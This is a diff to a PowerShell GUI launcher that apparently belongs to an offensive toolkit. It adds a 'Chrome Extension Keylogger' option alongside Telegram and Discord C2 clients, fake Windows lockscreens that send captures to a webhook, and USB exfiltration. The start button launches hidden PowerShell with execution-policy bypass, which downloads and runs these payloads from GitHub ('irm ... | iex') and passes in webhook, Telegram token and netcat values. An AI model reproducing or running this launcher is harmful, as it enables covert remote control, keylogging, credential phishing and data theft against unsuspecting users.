@@ -54,6 +54,7 @@ $items = @(
 "Windows 11 Lockscreen"    
 "Dummy Folder Creator"
 "Exfiltrate to USB"
+"Chrome Extension Keylogger"
 )
 
 $form = New-Object System.Windows.Forms.Form
@@ -212,8 +213,10 @@ $startButton.Add_Click({
     $ghurl = $PastebinInput.Text
     $tg = $TGTokenInput.Text
     $NCurl = $netcatInput.Text
-    if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
-    
+
+    # Webhook shortened URL handler
+    $hookurl = (irm $hookurl).url
+
     switch ($selectedItem) {
         "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
         "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
@@ -238,11 +241,12 @@ $startButton.Add_Click({
         "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
         "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
         "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
-        "Exfiltrate to USB"{$url = "$BaseURL/ExfiltrateToUSB.ps1"}
+        "Exfiltrate to USB"        {$url = "$BaseURL/ExfiltrateToUSB.ps1"}
+        "Chrome Extension Keylogger"        {$url = "$BaseURL/ChromeLog.ps1"}
     }
     Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
     if(($hiddenbox.Checked) -and ($selectedItem -notlike "*Console*") -and ($selectedItem -notlike "*LAN*")){
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -NonI -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
         Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
     }
     else{
@@ -284,7 +288,8 @@ $infoButton.Add_Click({
         "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
         "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
         "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
-        "Exfiltrate to USB"{$url = "$BaseURL/ExfiltrateToUSB.ps1"}
+        "Exfiltrate to USB"        {$url = "$BaseURL/ExfiltrateToUSB.ps1"}
+        "Chrome Extension Keylogger"        {$url = "$BaseURL/ChromeLog.ps1"}
     }
     $fileContent = Invoke-RestMethod -Uri $Url
     $pattern = '(?s)<#(.*?)#>'
@@ -297,4 +302,3 @@ $infoButton.Add_Click({
     Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"
 })
 [Windows.Forms.Application]::Run($form)
-
